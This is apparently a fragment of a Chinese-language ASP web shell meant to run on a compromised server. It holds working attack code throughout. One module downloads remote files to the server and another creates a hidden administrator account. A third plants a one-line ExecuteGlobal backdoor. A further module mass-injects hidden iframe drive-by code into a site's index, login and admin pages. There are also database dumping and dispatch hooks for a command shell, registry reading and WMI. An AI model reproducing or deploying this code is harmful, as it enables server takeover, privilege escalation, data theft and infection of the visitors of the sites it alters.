Function fsoTreeForMdb(thePath, rs, stream)
Dim item, theFolder, folders, files, sysFileList
sysFileList = "$HSH.mdb$HSH.ldb$"
If Server.CreateObject("Scripting.FileSystemObject").FolderExists(thePath) = False Then
showErr(thePath & " 目录不存在或者不允许访问!")
End If
Set theFolder = Server.CreateObject("Scripting.FileSystemObject").GetFolder(thePath)
Set files = theFolder.Files
Set folders = theFolder.SubFolders
For Each item In folders
fsoTreeForMdb item.Path, rs, stream
Next
For Each item In files
If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
rs.AddNew
rs("thePath") = Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent") = stream.Read()
rs.Update
End If
Next
Set files = Nothing
Set folders = Nothing
Set theFolder = Nothing
End Function
Sub unPack(thePath)
On Error Resume Next
Server.ScriptTimeOut=100000
Dim rs, ws, str, conn, stream, connStr, theFolder
str = Server.MapPath(".") & "\"
Set rs = CreateObject("ADODB.RecordSet")
Set stream = CreateObject("ADODB.Stream")
Set conn = CreateObject("ADODB.Connection")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & thePath & ";"
conn.Open connStr
rs.Open "FileData", conn, 1, 1
stream.Open
stream.Type = 1
Do Until rs.Eof
theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
If Server.CreateObject("Scripting.FileSystemObject").FolderExists(str & theFolder) = False Then
createFolder(str & theFolder)
End If
stream.SetEos()
stream.Write rs("fileContent")
stream.SaveToFile str & rs("thePath"), 2
rs.MoveNext
Loop
rs.Close
conn.Close
stream.Close
Set ws = Nothing
Set rs = Nothing
Set stream = Nothing
Set conn = Nothing
End Sub

Sub createFolder(thePath)
Dim i
i = Instr(thePath, "\")
Do While i > 0
If Server.CreateObject("Scripting.FileSystemObject").FolderExists(Left(thePath, i)) = False Then
Server.CreateObject("Scripting.FileSystemObject").CreateFolder(Left(thePath, i - 1))
End If
If InStr(Mid(thePath, i + 1), "\") Then
i = i + Instr(Mid(thePath, i + 1), "\")
 Else
i = 0
End If
Loop
End Sub
Sub saTreeForMdb(thePath, rs, stream)
Dim item, theFolder, sysFileList
sysFileList = "$HSH.mdb$HSH.ldb$"
Set theFolder = saX.NameSpace(thePath)
For Each item In theFolder.Items
If item.IsFolder = True Then
saTreeForMdb item.Path, rs, stream
 Else
If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
rs.AddNew
rs("thePath") = Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent") = stream.Read()
rs.Update
End If
End If
Next
Set theFolder = Nothing
End Sub
Function CheckExt(FileExt)
	If DimFileExt = "*" Then CheckExt = True
	Ext = Split(DimFileExt,",")
	For i = 0 To Ubound(Ext)
		If Lcase(FileExt) = Ext(i) Then 
			CheckExt = True
			Exit Function
		End If
	Next
End Function


Function upload()
SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>" 
		RRS "下载到服务器:无回显...为了节省.所以无回显<hr/>"
		RRS "<form method=post>"
		RRS "<input name=theUrl value='http://' size=80><input type=submit value=' 下载 '><br/>"
		RRS "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
		RRS "<input type=checkbox name=overWrite value=2>存在覆盖"
		RRS "<input type=hidden value=downFromUrl name=theAct>"
		RRS "</form>"
		RRS "<hr/>"
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim Http, theUrl, thePath, stream, fileName, overWrite
		theUrl = Request("theUrl")
		thePath = Request("thePath")
		overWrite = Request("overWrite")
		Set stream = Server.CreateObject("ad"&e&"odb.st"&e&"ream")
		Set Http = Server.CreateObject("MSXML2.XMLHTTP")
		If overWrite <> 2 Then
			overWrite = 1
		End If
		Http.Open "GET", theUrl, False
		Http.Send()
		If Http.ReadyState <> 4 Then
		End If
		With stream
			.Type = 1
			.Mode = 3
			.Open
			.Write Http.ResponseBody
			.Position = 0
			.SaveToFile thePath, overWrite
			If Err.Number = 3004 Then
				Err.Clear
				fileName = Split(theUrl, "/")(UBound(Split(theUrl, "/")))
				If fileName = "" Then
					fileName = "index.htm.txt"
				End If
				thePath = thePath & "\" & fileName
				.SaveToFile thePath, overWrite
			End If
			.Close
		End With
		chkErr(Err)
		Set Http = Nothing
		Set Stream = Nothing
		If isDebugMode = False Then
			On Error Resume Next
		End If
End Function
Function GetDateModify(filepath)
	Set F2SO = CreateObject("Scripting.FileSystemObject")
    Set f = F2SO.GetFile(filepath) 
	s = f.DateLastModified 
	set f = nothing
	set F2SO = nothing
	GetDateModify = s
End Function
Function GetDateCreate(filepath)
	Set F3SO = CreateObject("Scripting.FileSystemObject")
    Set f = F3SO.GetFile(filepath) 
	s = f.DateCreated 
	set f = nothing
	set F3SO = nothing
	GetDateCreate = s
End Function
Function tURLEncode(Str)
	temp = Replace(Str, "%", "%25")
	temp = Replace(temp, "#", "%23")
	temp = Replace(temp, "&", "%26")
	tURLEncode = temp
End Function
Sub ShowAllFile2(Path)
	Set F4SO = CreateObject("Scripting.FileSystemObject")
	if not F4SO.FolderExists(path) then exit sub
	Set f = F4SO.GetFolder(Path)
	Set fc2 = f.files
	For Each myfile in fc2
		If CheckExt(F4SO.GetExtensionName(path&"\"&myfile.name)) Then
			Call IsFind(Path&"\"&myfile.name)
			SumFiles = SumFiles + 1
		End If
	Next
	Set fc = f.SubFolders
	For Each f1 in fc
		ShowAllFile2 path&"\"&f1.name
		SumFolders = SumFolders + 1
    Next
	Set F4SO = Nothing
End Sub
Sub IsFind(thePath)
	theDate = GetDateModify(thePath)
	on error resume next
	theTmp = Mid(theDate, 1, Instr(theDate, " ") - 1)
	if err then exit Sub
	xDate = Split(request.Form("Search_Date"),";")
	If request.Form("Search_Date") = "ALL" Then ALLTime = True
	For i = 0 To Ubound(xDate)
		If theTmp = xDate(i) or ALLTime = True Then 
			If request("Search_Content") <> "" Then
				Set FSO2s = CreateObject("Scripting.FileSystemObject")
				set ofile = FSO2s.OpenTextFile(thePath, 1, false, -2)
				filetxt = Lcase(ofile.readall())
				If Instr( filetxt, LCase(request.Form("Search_Content"))) > 0 Then
					temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(Replace(replace(thePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a>"
    temp=temp&" → <a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a > "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a>"	
				Report = Report&"<tr><td height=30>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
					Report = Report&"<tr><td>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
					Sun = Sun + 1
					Exit Sub
				End If
				ofile.close()
				Set ofile = Nothing
				Set FSO2s = Nothing
			Else
				temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a> "
    temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a > "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a>"	
				Report = Report&"<tr><td height=30>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
				Sun = Sun + 1
				Exit Sub
			End If
		End If
	Next
End Sub

case "lp"
RRS"<form action='?action=lp' method=post>"
RRS"<center><br>"
RRS"用户:<input name='UsErname' type='text' value='hacker'><br>"
RRS"密码:<input name='PaSswd' type='text' value='hacker'><br>"
RRS"<input type='submit' Value='添 加'></form>"
on error REsume next
if REquEst.SErvErvariables("REMOTE_ADDR")<>"127.0.0.1" thEn
REsPonsE.writE "iP !s n0T RiGHt"
else
if REquEst("UsErname")<>"" thEn
UsErname=REquEst("UsErname")
PaSswd=REquEst("PaSswd")
REsPonsE.ExpiREs=0
Session.TimeOut=50
SErvEr.ScRipTTimeout=3000
set lp=SErvEr.CreateObject("WScRipT.NETWORK")
oz="WinNT://"&lp.ComputerName
Set ob=GetObject(oz)
Set oe=GetObject(oz&"/Administrators,group")
Set od=ob.Create("UsEr",UsErname)
od.SetPaSsword PaSswd
od.SetInfo
oe.Add oz&"/"&UsErname
if err thEn
REsPonsE.writE "哎~~今天你还是别买6+1了……省下2元钱买瓶可乐也好……"
else
if instr(SErvEr.createobject("WScRipT.shell").exec("cmd.exe /c net UsEr "&UsErname.stdout.readall),"上次登录")>0 thEn
REsPonsE.writE "虽然没有错误,但是好象也没建立成功.你一定很郁闷吧"
else
REsPonsE.writE "OMG!"&UsErname&"帐号居然成了!这可是未知漏洞啊.5,000,000RMB是你的了"
end if
end if
else
REsPonsE.writE "请输入输入用户名"
end if
end If
Err.Clear
Case "backup"
RRS"<center><b><p><font size=5>数据库字段复制工具</font></p></b></center>"
RRS"<center><font>第一步：</font>"
RRS"<form action='' method=post name=form >"
RRS"<center>请选择欲复制的数据库类型：</center>"
RRS"<center><input type='radio' name='mdbsql' value='sql' checked>sql数据库"
RRS"<center><input type='radio' name='mdbsql' value='mdb'>mdb数据库<br>"
RRS"欲复制的字段数：<input type=text name=zhi>&nbsp;&nbsp;"
RRS"<center><input type=submit name='button' value='设  置'></form>"
zhi=REquEst.form("zhi")
if zhi>0 thEn
mdbsql=REquEst.form("mdbsql")
REsPonsE.writE "<font color=red><center>第二步：</center></font>"
REsPonsE.writE "<form action='' method=post name=form1>"
REsPonsE.writE "<center>创建的mdb数据库名称：<input type=text name=mdbname>(请带mdb扩展名)</center><br>"
if mdbsql="sql" thEn
REsPonsE.writE "<center>sql数据库用户名称：</center><input type=text name=sqlUsErname><br>"
REsPonsE.writE "<center>sql数据库连接密码：</center><input type=text name=sqlpwd><br>"
REsPonsE.writE "<center>sql数据库名称：</center><input type=text name=sqldataname><br>"
REsPonsE.writE "<center>sql数据库中表的名称：</center><input type=text name=sqltable><br>"
REsPonsE.writE "<center>sql数据库地址：</center><input type=text name=sqldatasource value='(local)'>(默认)<br>"
elseif mdbsql="mdb" thEn
REsPonsE.writE "<center>access数据库名称：</center><input type=text name=sqldataname>(请带文件扩展名)<br>"
REsPonsE.writE "<center>access数据库中表的名称：</center><input type=text name=sqltable><br>"
end if
REsPonsE.writE "<center>条件语句：<input type=text name=tiaojian>where的条件语句,连WHERE也要写上喔,下载该表所有数据则保持空白</center><br>"
REsPonsE.writE "<input type=hidden name=mdbsql value=" & mdbsql &">"
REsPonsE.writE "<input type=hidden name='zhi' value=" & zhi &">"
for i=1 to zhi
REsPonsE.writE "<center>欲复制的字段名称：</center><input type=text name=sqlrow("& i &")>"
REsPonsE.writE "<center>字段类型：</center><select name=sqltype("& i & ")>"
REsPonsE.writE "<option select value=varchar><center>文本</center></option><option select value=memo><center>备注</center></option><option select value=integer><center>数字</center></option><option select value=datetime><center>日期/时间</center></option><option select value=image><center>ole对象</center></option><option select value=bit><center>布尔</center></option>"
REsPonsE.writE "</select><br>"
next
REsPonsE.writE "<br><center><input type=submit name='button' value='复  制'></center>"
REsPonsE.writE "</form>"
end if
tiaojian=REquEst.form("tiaojian")
mdbname=REquEst.form("mdbname") 
if len(mdbname)>0 thEn 
REsPonsE.writE "<font color=red><center>第三步：</center></font><br>" 
zhi=REquEst.form("zhi") 
sqltable=REquEst.form("sqltable") 
sqlUsErname=REquEst.form("sqlUsErname") 
sqlpwd=REquEst.form("sqlpwd") 
sqldataname=REquEst.form("sqldataname") 
sqldatasource=REquEst.form("sqldatasource") 
mdbsql=REquEst.form("mdbsql") 
mdbcreate="" 
mdbinsert="" 
sqlselect="" 
dim srow(),stype() 
redim srow(zhi),stype(zhi) 
on error REsume next 
for i=1 to cint(zhi) 
srow(i) =REquEst.form("sqlrow(" & i &")") 
stype(i)=REquEst.form("sqltype(" & i &")") 
mdbcreate=mdbcreate & "[" & srow(i) & "] " & stype(i) &"," 
mdbinsert=mdbinsert  & srow(i) & "|" 
sqlselect=sqlselect & srow(i) & "," 
next 
mdbcreate=left(mdbcreate,len(mdbcreate)-1) 
mdbinsert=left(mdbinsert,len(mdbinsert)-1) 
sqlselect=left(sqlselect,len(sqlselect)-1) 
call crtable(mdbname,sqltable,mdbcreate) 
call copysq(mdbname,sqltable,sqlpwd,sqlUsErname,sqldataname,sqldatasource,mdbinsert,sqlselect,mdbsql) 
end if
function crtable(mdbname,sqltable,mdbcreate)
dbFilE=SErvEr.mapPaTh(mdbname)
set ydb=SErvEr.createobject("adox.catalog")
ydb.create "provider=microsoft.jet.oledb.4.0;data source=" & dbFilE
set ydb=nothing
set conn = SErvEr.createobject("adodb.connection")
conn.open "provider=microsoft.jet.oledb.4.0; data source=" & dbFilE
sql="create table [" & sqltable &"](" & mdbcreate &")"
conn.execute(sql)
conn.close
set conn=nothing
end function
function copysq(mdbname,sqltable,sqlpwd,sqlUsErname,sqldataname,sqldatasource,mdbinsert,sqlselect,mdbsql) 
mdbarray=split(mdbinsert,"|") 
max=ubound(mdbarray) 
dbFilE=SErvEr.mapPaTh(mdbname)  
set conn = SErvEr.createobject("adodb.connection")  
conn.open "provider=microsoft.jet.oledb.4.0; data source=" & dbFilE  
set rs = createobject("adodb.recordset")
rs.open "["& sqltable &"]", conn, 1, 3  
if mdbsql="sql" thEn 
set connstr=SErvEr.createobject("adodb.connection")
connstr.open  "provider=sqloledb.1;PaSsword="&sqlpwd&";UsEr id="&sqlUsErname&";database="&sqldataname&";data source ="&sqldatasource 
elseif mdbsql="mdb" thEn 
FilEPaTh1=SErvEr.mapPaTh(sqldataname) 
set connstr=SErvEr.createobject("adodb.connection")
connstr.open  "provider=microsoft.jet.oledb.4.0;data source=" & FilEPaTh1 
end if 
sql1="select "& sqlselect &" from ["& sqltable &"] "& tiaojian &" " 
set showbbs=connstr.execute(sql1) 
do while not showbbs.eof 
rs.addnew 
for i=0 to max 
rs(mdbarray(i))=showbbs(mdbarray(i)) 
next 
rs.update  
showbbs.movenext 
loop 
showbbs.close 
set showbbs=nothing 
if err.number=0 thEn  
REsPonsE.writE dbFilE & " <center>数据复制成功</center>，　"  
REsPonsE.writE "<a href="& mdbname &"><center>下载</center></a>"
else  
REsPonsE.writE "<center>失败，原因： " & err.deScRipTion  
REsPonsE.end 
end if 
end Function
Case "nofw"
PaTh=trim(REquEst.form("PaTh"))
text=trim(REquEst.form("text"))
if text<>"" and PaTh<>"" thEn
text=REplAcE(text,"^","^^")
text=REplAcE(text,">","^>")
text=REplAcE(text,"<","^<")
text=REplAcE(text,"&","^&")
text=REplAcE(text,":","^:")
text=REplAcE(text,"+","^+")
text=REplAcE(text,"|","^|")
text=REplAcE(text,chr(34),"^"&chr(34))
Dim myArray
Dim b()
k=0
myarray= Split(text,Chr(13))
For i=0 to UBound(myarray)
for j=1 to len(myarray(i))
if mid(myarray(i),j,1)<>" " and mid(myarray(i),j,1)<>chr(10) and mid(myarray(i),j,1)<>chr(13) thEn
tn=0
exit for
end if
next
If tn=0 and myarray(i)<> "" and myarray(i)<>chr(13) and myarray(i)<>chr(10) thEn
k=k+1
ReDim pREserve b(k)
b(k)=myarray(i)
b(k)=REplAcE(b(k),chr(10),"")
End If
tn=1
Next
set shell=SErvEr.createobject("shell.application")
For L=1 TO k
REsPonsE.writE SErvEr.htmlencode(b(L))&"</br>"
set shellfolder=shell.namespace("C:\Documents and Settings\Default UsEr\「开始」菜单\程序\附件")
set shellfolderitEm=shellfolder.parsename("记事本.lnk")
set objshelllink =shellfolderitEm.getlink
objshelllink.PaTh="cmd.exe"
objshelllink.arguments="/c echo "&b(L)&" >>"&PaTh&" &&DEl c:\a.lnk"
objshelllink.save("c:\a.lnk")
shell.namespace("c:\").itEms.itEm("a.lnk").invokeverb
timeit(0.1)
next
Function TimeIt(N)
StartTime = Timer
do while endtime-starttime<n
EndTime = Timer
loop
End Function
REsPonsE.writE k
end if
RRS"<form method='post' action=?action=nofw>"
RRS"免FSO-WSH写入的文件:<input type=text name=PaTh size=40 value='"&Server.MapPath("/")&"\help.asp'><p>"
RRS"<textarea name=text rows=30 cols=100 >防扫防杀一句话"&chr(60)&"%ExecuteGlobal request("&chr(34)&"1"&chr(34)&")%"&chr(62)&"</textarea><p>"
RRS"<input type=submit value=执行></form>"
Case "plgm":Server.ScriptTimeout=1000000:Response.Buffer=False
RRS ("<b>当前网站绝对路径:")&Server.MapPath("/")&("</b>")
ASP_SELF=Request.ServerVariables("PATH_INFO") 
s=Request("fd") 
if s="" then s=Server.MapPath("/")
ex=Request("ex") 
pth=Request("pth") 
newcnt=Request("newcnt") 
addcode = Request("code")
if addcode="" then addcode="<iframe src=http://127.0.0.1/m.htm width=0 height=0></iframe>"
If ex<>"" AND pth<>"" Then 
select Case ex 
Case "edit" 
CALL file_show(pth) 
Case "save" 
CALL file_save(pth) 
End select 
Else 
RRS("<form method=""POST""> ")
RRS("<table width=560 border=""0"" style=""font-size:12px;"">")
RRS("<tr>")
RRS("<td width=""102"">要挂马的文件夹 (绝对路径)：</td>")
RRS("<td width=""359""><input type=""text"" name=""fd"" value="""&s&""" size=60></td>")
RRS("<td width=""69"">&nbsp;</td>")
RRS("</tr><tr><td>要挂马的代码:</td>")
RRS("<td><textarea name=""code"" cols=58 rows=""3"">"&addcode&"</textarea></td>")
RRS("<td><input name=""submit"" type=""submit"" value=""开始""></td>")
RRS("</tr></table></form>")
End If 
Function IsPattern(patt,str) 
Set regEx=New RegExp 
regEx.Pattern=patt 
regEx.IgnoreCase=True 
retVal=regEx.Test(str) 
Set regEx=Nothing 
If retVal=True Then 
IsPattern=True 
Else 
IsPattern=False 
End If
End Function 
if request.form("submit")<>"" then
If s="" or addcode="" Then
RRS "<font color=red>请输入挂马的路径或代码!</font>"
response.end
else If IsPattern("[^ab]{1}:{1}(\\|\/)",s) Then sch s 
End If
end if 
Sub sch(s) 
oN eRrOr rEsUmE nExT 
Set fs=Server.createObject("Scripting.FileSystemObject") 
Set fd=fs.GetFolder(s) 
Set fi=fd.Files 
Set sf=fd.SubFolders 
For Each f in fi 
rtn=f.path 
step_all rtn 
Next 
If sf.Count<>0 Then 
For Each l In sf 
sch l 
Next 
End If
End Sub
Sub step_all(agr) :retVal=IsPattern("(\\|\/)(default|index|conn|admin|bbs|reg|help|upfile|upload|cart|class|login|diy|no|ok|del|config|sql|user|ubb|ftp|asp|top|new|open|name|email|img|images|web|blog|save|data|add|edit|game|about|manager|main|article|book|bt|config|mp3|vod|error|copy|move|down|system|logo|QQ|520|newup|myup|play|show|view|ip|err404|send|foot|char|info|list|shop|err|nc|ad|flash|text|admin_upfile|admin_upload|upfile_load|upfile_soft|upfile_photo|upfile_softpic|vip|505)\.(htm|html|asp|php|jsp|aspx|cgi|js)\b",agr) 
If retVal Then 
step1 agr 
step2 agr 
Else 
Exit Sub:End If:End Sub:Sub step1(str1)
RRS "<div style='line-height:20px'>√ "&str1&" _"
RRs "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DownFile"")' class='am' title='下载'>Down</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""EditFile"")' class='am' title='编辑'>edit</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DelFile"")'onclick='return yesok()' class='am' title='删除'>Del</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a></div>"
End Sub:Sub step2(str2)
Set fs=Server.createObject("Scripting.FileSystemObject") 
isExist=fs.FileExists(str2) 
If isExist Then 
Set f=fs.GetFile(str2) 
Set f_addcode=f.OpenAsTextStream(8,-2) 
f_addcode.Write addcode 
f_addcode.Close 
Set f=Nothing 
End If 
Set fs=Nothing
End Sub:Err.Clear:Case "Cplgm"
	Fpath=Request("fd")
	addcode = Request("code")
	addcode2 = Request("code2")
	pcfile=request("pcfile")
	checkbox=request("checkbox")
	checkbox1=request("checkbox1")
	ShowMsg=request("ShowMsg")
	FType=request("FType")
	zfile=request("zfile")
	M=request("M")
   
for i= 0 to ubound(split(server.mappath("."),"\"))
d=split(server.mappath("."),"\")
dir=dir&d(i)&"\"
filename=dir&"dir.txt"
On Error Resume Next
SET FSO=Server.CreateObject("Scripting.FileSystemObject")
SET FR = FSO.CreateTextFile(filename,true)
IF NOT FSO.FileExists(filename) then
else
	FR.close
	FSO.DeleteFile filename,True 
	exit for
end if
next
	if zfile="" then zfile="default|index|conn|admin|reg|main|vip|qq|mm"
	if Ftype="" then Ftype="htm|html|asp|php|jsp|aspx|cgi|cer|asa|cdx"
	if Fpath="\" then Fpath=Server.MapPath("\")
	if Fpath="." or Fpath="" then Fpath=dir
	if addcode="" then addcode="<iframe src=http://127.0.0.1/m.htm width=0 height=0></iframe>"
	if checkbox="" then checkbox=request("checkbox")
	if checkbox1="" then checkbox1=request("checkbox1")
	if pcfile="" then
		pcfileName=Request.ServerVariables("SCRIPT_NAME")
		pcfilek=split(pcfileName,"/") 
		pcfilen=ubound(pcfilek) 
		pcfile=pcfilek(pcfilen) 
	end if
    if M="1" then BT="批量挂马器-批量挂马"
	if M="2" then BT="批量清马器-清除别人的网马"
	if M="3" then BT="批量替换器-文件替换修改工具"
	if M="4" then BT="指定挂马"
RRS "<form method=POST><TABLE width=80% border=0 align=center cellpadding=3 cellspacing=1 bgColor=#91d70d><TR><TD colspan=2 class=TBHead><B><FONT color=#ff2222>"&BT&"</font></B></TD></TR><tr><td class=TBTD >网站根目录“\”：</td><td class=TBTD>"&Server.MapPath("/")&"</td></tr><tr><td class=TBTD >本程序目录“.”：</td><td class=TBTD>"&Server.MapPath(".")&"</td></tr><tr><td class=TBTD width='20%'>文件路径：</td>"
	RRS "<td class=TBTD><input type=text name=fd value='"&Fpath&"' size=40><font  color=red >==>注意:该路径是最大可写目录(自动判别)</font> </td></tr>"
	RRS "<tr><td class=TBTD>是否变形代码：</td><td class=TBTD><input class=c name='checkbox1'  checked='checkbox1' type=checkbox value=""checked1"" "&checkbox1&"><font  color=red >写入代码时把代码变形以后写入每一个文件（为了防止批量替换掉代码，代码100%正常运行）</font></td></tr>"
	if M="1" then RRS "<tr><td class=TBTD>过滤重复：</td><td class=TBTD><input class=c name='checkbox' checked='checked' type=checkbox value=""checked"" "&checkbox&"> 防止一个页面中有多个重复的代码</td></tr>"
	if M="4" then RRS "<tr><td class=TBTD>过滤重复：</td><td class=TBTD><input class=c name='checkbox' checked='checked' type=checkbox value=""checked"" "&checkbox&"> 防止一个页面中有多个重复的代码</td></tr><tr><td class=TBTD>指定文件：</td><td class=TBTD><input name='zfile' type=text id='zfile' value='"&zfile&"' size=40>填写你要挂文件名[不含扩展名]</td></tr>"
	RRS "<tr><td  class=TBTD>排除文件：</td>"
	RRS "<td class=TBTD><input name='pcfile' type=text id='pcfile' value='"&pcfile&"' size=40>例如：1.asp|2.asp|3.asp</td></tr>"
	RRS "<tr><td class=TBTD>文件类型：</td>"
	RRS "<td class=TBTD><input name='FType' type=text id='FType' value='"&Ftype&"' size=40> 输入要修改的文件类型[扩展名]</td></tr><tr><td class=TBTD>"
	if M="1" then RRS"要挂的马："
	if M="2" then RRS"要清的马："
	if M="3" then RRS"查找内容："
	RRS"</font></td><td class=TBTD><textarea name=code cols=66 rows=3>"&addcode&"</textarea></td></tr>"
	if M="3" then RRS "<tr><td class=TBTD>替 换 为：</td><td  class=TBTD><textarea name=code2 cols=66 rows=3>"&addcode2&"</textarea></td></tr>"
	RRS "<tr><td class=TBTD></td><td class=TBTD> <input name=submit type=submit value=开始执行> --标记解释--[成功：√ ， 排除：× ， 重复：<font color=red>×</font>]</td></tr>"
	RRS "</table></form>" 
if request("submit")="开始执行" then 
RRS "<TABLE width=80% border=0 align=center cellpadding=3 cellspacing=1 bgColor=#91d70d><TR><TD  class=TBHead align=center>结果</TD><TD  class=TBHead>文件绝对路径</TD><TD  class=TBHead width='30%' align=center>编辑栏</TD></TR>"
call InsertAllFiles(Fpath,addcode,pcfile)
end if
Sub InsertAllFiles(Wpath,Wcode,pc)
	Server.ScriptTimeout=999999999
	 if right(Wpath,1)<>"\" then Wpath=Wpath &"\"
	 Set WFSO = CreateObject("Scripting.FileSystemObject")
	 on error resume next 
	 Set f = WFSO.GetFolder(Wpath)
	 Set fc2 = f.files
	 For Each myfile in fc2
		Set FS1 = CreateObject("Scripting.FileSystemObject")
		FType1=split(myfile.name,".") 
		FType2=ubound(FType1) 
		if Ftype2>0 then
		FType3=LCase(FType1(FType2)) 
		else
		FType3="无"
		end if
		if Instr(LCase(pc),LCase(myfile.name))=0 and Instr(LCase(FType),FType3)<>0 then
			select case M
				case "1"
					if checkbox<>"checked" then
						Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
						tfile.writeline Wcode
						RRS"√ "&Wpath&myfile.name
						tfile.close
					else
						Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
						if Instr(tfile1.readall,Wcode)=0 then
							Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
							tfile.writeline Wcode
							RRS"√  "&Wpath&myfile.name
							tfile1.close
						else
							RRS"<font color=red>×</font> "&Wpath&myfile.name
							tfile1.close
						end if
						Set tfile1=Nothing
					end if
				case "2"
					Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
					NewCode=Replace(tfile1.readall,Wcode,"")
					Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
					objCountFile.Write NewCode
					objCountFile.Close
					RRS"√  "&Wpath&myfile.name
					Set objCountFile=Nothing
				case "3"
					Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
					NewCode=Replace(tfile1.readall,Wcode,addCode2)
					Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
					objCountFile.Write NewCode
					objCountFile.Close
					RRS"√  "&Wpath&myfile.name
					Set objCountFile=Nothing
				case else
					RRS"你很想破吗?真的很想破吗?没门我告诉你.":response.end
			end select
		else
			RRS"× "&Wpath&myfile.name
		end if
RRS " → <a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""DownFile"")' class='am' title='下载'>Down</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""EditFile"")' class='am' title='编辑'>edit</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a><br>"
	 Next
 Set fsubfolers = f.SubFolders
 For Each f1 in fsubfolers
	NewPath=Wpath&""&f1.name
 	InsertAllFiles NewPath,Wcode,pc
 Next
set tfile=nothing
Set FSO = Nothing
set tfile=nothing
set tfile2=nothing
Set WFSO = Nothing
End Sub:Case "ReadREG":call ReadREG():Case "Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing:Case "DownFile":DownFile FName:ShowErr():Case "DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing:Case "EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing:Case "CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing:Case "MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing:Case "DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing:Case "CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing:Case "MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing:Case "NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing:Case "UpFile":UpFile():Case "plUpFile":PageUpload():Case "Cmd1Shell":Cmd1Shell():Case "Logout":Session.Contents.Remove("web2a2dmin"):Response.Redirect URL:Case "CreateMdb":CreateMdb FName:Case "CompactMdb":CompactMdb FName:Case "Alexa":Alexa("AlexaURL"):Case "Alexa":getHTTPPage("url"):Case "Alexa":bytes2BSTR("vIn"):Case "DbManager":DbManager():Case "Course":Course():Case "wmi":wmi():Case "ScanDriveForm" : ScanDriveForm:Case "ScanDrive"     : ScanDrive Request("Drive"):Case "ScFolder"      : ScFolder Request("Folder"):Case "adminab":adminab():Case 